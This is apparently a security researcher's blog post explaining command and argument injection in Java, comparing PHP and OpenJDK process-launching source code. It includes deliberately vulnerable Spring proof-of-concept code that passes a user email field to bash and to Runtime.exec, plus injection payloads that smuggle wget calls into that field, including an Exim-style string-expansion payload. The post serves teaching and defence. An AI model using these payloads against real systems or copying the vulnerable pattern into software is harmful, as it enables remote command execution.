---
layout: post
title:  "JAVA Command and Argument Injection"
categories: TheoricalPractise 
tags:  CommandI ArgumentI JAVA
author: AlvaroFolgado
---

* content
{:toc}


![](https://github.com/AlvFolgado/WebRCEPoCs/blob/master/java/Deserialization/DeserializationPoC/web/resources/java.jpg?raw=true)

## Introduction

Second chapter of "TheoricalPractise", in this time we focus in JAVA. In the same way we did in [Php:CommandI&ArgumentI](http://www.afolgado.com/2017/06/10/phpcommandiargumenti/), we are going to exploit the basic dangerous functions to perform system commands in JAVA.

The [PoC](https://github.com/AlvFolgado/WebRCEPoCs/tree/master/java/CommandI) have the same properties that the one in PHP, it is made using spring framework.

## JAVA VS PHP Command Injection: A fast look within source code to spot differences

If we look at the previous PoC for PHP, we can realize the first difference: PHP dangerous functions call a sh/bash/cmd by default, but JAVA doesn't. Java on the other hand perform a fork() of the given command to create a child process and pass to it the given arguments. We can see the difference looking at the source code of both languages:


Let's pick proc_open() from PHP, as we can see a sh is being called and arguments are being passed to it,

php-src/ext/standard/proc_open.c:

```c
/* proto resource proc_open(string command, array descriptorspec, array &pipes [, string cwd [, array env [, array other_options]]])
   Run a process with more control over it's file descriptors */
PHP_FUNCTION(proc_open)
{
    char *command, *cwd=NULL;
    size_t command_len, cwd_len = 0;
[...]
        if (env.envarray) {
            execle("/bin/sh", "sh", "-c", command, NULL, env.envarray);
        } else {
            execl("/bin/sh", "sh", "-c", command, NULL);
        }
[...]
```

If we follow the calls from ProcessBuilder().start() using openjdk source...

OpenJDK8u/jdk-3462d04401ba/src/share/classes/java/lang/ProcessBuilder.java:

```java
public Process start() throws IOException {
[...]
 try {
            return ProcessImpl.start(cmdarray,
                                     environment,
                                     dir,
                                     redirects,
                                     redirectErrorStream);
[...]
```

OpenJDK8u/jdk-3462d04401ba/src/solaris/classes/java/lang/ProcessImpl.java:

```java
static Process start(String[] cmdarray,
                         java.util.Map<String,String> environment,
                         String dir,
                         ProcessBuilder.Redirect[] redirects,
                         boolean redirectErrorStream)
[...]
return new UNIXProcess
            (toCString(cmdarray[0]),
             argBlock, args.length,
             envBlock, envc[0],
             toCString(dir),
                 std_fds,
             redirectErrorStream);
[...]
```

OpenJDK8u/jdk-3462d04401ba/src/solaris/classes/java/lang/UNIXProcess.java:
```java
 private native int forkAndExec(int mode, byte[] helperpath,
                                   byte[] prog,
                                   byte[] argBlock, int argc,
                                   byte[] envBlock, int envc,
                                   byte[] dir,
                                   int[] fds,
                                   boolean redirectErrorStream)
[...]
UNIXProcess(final byte[] prog,
                final byte[] argBlock, final int argc,
                final byte[] envBlock, final int envc,
                final byte[] dir,
                final int[] fds,
                final boolean redirectErrorStream)
            throws IOException {

        pid = forkAndExec(launchMechanism.ordinal() + 1,
                          helperpath,
                          prog,
                          argBlock, argc,
                          envBlock, envc,
                          dir,
                          fds,
                          redirectErrorStream);
[...]
```
Finally we arrive to the C source code (forkAndExec, a JAVA native function in C), the main process is being called using the different fork() depending of the Operating System,

OpenJDK8u/jdk-3462d04401ba/src/solaris/native/java/lang/UNIXProcess_md.c:
```c
Java_java_lang_UNIXProcess_forkAndExec(JNIEnv *env,
                                       jobject process,
                                       jint mode,
                                       jbyteArray helperpath,
                                       jbyteArray prog,
                                       jbyteArray argBlock, jint argc,
                                       jbyteArray envBlock, jint envc,
                                       jbyteArray dir,
                                       jintArray std_fds,
                                       jboolean redirectErrorStream)
{
[...]
resultPid = startChild(env, process, c, phelperpath);
    assert(resultPid != 0);
    if (resultPid < 0) {
        switch (c->mode) {
          case MODE_VFORK:
            throwIOException(env, errno, "vfork failed");
            break;
          case MODE_FORK:
            throwIOException(env, errno, "fork failed");
            break;
          case MODE_POSIX_SPAWN:
            throwIOException(env, errno, "spawn failed");
            break;
        }
[...]
```

This could be understood as an ultimate solution to avoid Command Injection attacks in Java, but the true thing is in a lot of situations developers will need call a sh/bash/cmd process to execute some scripts among other reasons.
When this happens, as we can see in the first section of my PoC, Command Injection will be totally possible:

```java

      if ( ("Command Injection".equals(submit)) ){

            //We are passing strings without control to a sh/bash/cmd interpreter ==> Command Injection
            String[] cmd = new String[]{"/bin/bash","-c","/usr/sbin/sendmail -f"+emailFrom};
            Runtime.getRuntime().exec(cmd);

            //Same as Exec
            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.start();

```

By providing something like this Payload in the "emailFrom" input we can inject code without problems:


```bash
ss@email.com;wget http://127.0.0.1/test
ss@email.com|wget http://127.0.0.1/test
[...]
```
We can check the logs of a running local server to see the correct execution of "wget".


## JAVA Argument Injection: The tokenization of spaces

In this section we will not apply any special function to escape elements. The own natura of these two dangerous functions can provide us the protections to avoid Command Injection. But What happens with Argument Injection?
To answer this question we can look at the Definitions of both functions, and what inputs they accepts.

A. ProcessBuilder.java:

 As we can see in the [Definition](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html), ProcessBuilder accept an String[] or a List<String>. These elements define the process to call as the one in the first position of the array, and the rest as separate arguments.

 This mean, that if we are receiving an input String from a malicious user, we could not exploit the "spaces" anymore,since they will be just interpreted as a whole argument. The only way to implement this will be by intentionally tokenizing spaces from a whole userInput String and create the right String[].

 But, Who is going implement something that tokenize a String that could be crafted with an userInput? 

 B. Runtime.java:

Between the different inputs that exec method accepts, we can see [here](https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html) that a basic String input is accepted. But how this work? And where this String ends?

Let's look at the Runtime.java source code,

OpenJDK8u/jdk-3462d04401ba/src/share/classes/java/lang/Runtime.java:

```java

    public Process exec(String command) throws IOException {
        return exec(command, null, null);
    }

[...]


    public Process exec(String command, String[] envp, File dir)
        throws IOException {
        if (command.length() == 0)
            throw new IllegalArgumentException("Empty command");

        StringTokenizer st = new StringTokenizer(command);
        String[] cmdarray = new String[st.countTokens()];
        for (int i = 0; st.hasMoreTokens(); i++)
            cmdarray[i] = st.nextToken();
        return exec(cmdarray, envp, dir);
    }

[...]

    public Process exec(String[] cmdarray, String[] envp, File dir)
        throws IOException {
        return new ProcessBuilder(cmdarray)
            .environment(envp)
            .directory(dir)
            .start();
    }

```

So Runtime.java is really close to ProcessBuilder.java (since it is calling it in last instance), but doing "something else". Tokenizing a String input into a String[], taking in account spaces to separate arguments of a process call.

Taking account the spaces in a userInput String, without control, is equal to an Argument Injection.


```java

  }else if( ("Argument Injection".equals(submit)) ){
  
            //We are invoking an process without calling a sh/bash/cmd interpreter. But Still, thanks to Runtime.java
            //tokenizer, we are able to inject extra arguments to target process.
            String cmd = "/usr/sbin/sendmail -f" + emailFrom;
            Runtime.getRuntime().exec(cmd);
            
```

By providing something like this Payload in the "emailFrom" input we can inject code without problems:


```bash
ss@email.com -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}
```
We can check the logs of a running local server to see the correct execution of "wget".

## Conclusions

As a **Defender** let's try to use ProcessBuilder to perform system calls. If we need to use for some reason sh/bash/cmd, we should escape correctly the input to avoid injections. Something like escapeshellcmd/escapeshellarg in PHP.

As an **Attacker**, we should look to the different functions/features of target application to spot the obvious use of these system calls, and try different payloads. Response errors with particular codes like 500 after using special crafted inputs could help us to spot these functions. From a targeted point of view, understand the technology ahead and possible vulnerable 3PP software could be the opportunity to exploit target app.


## References

Special thanks to [Pierre Ernst](https://twitter.com/e_rnst) for his help



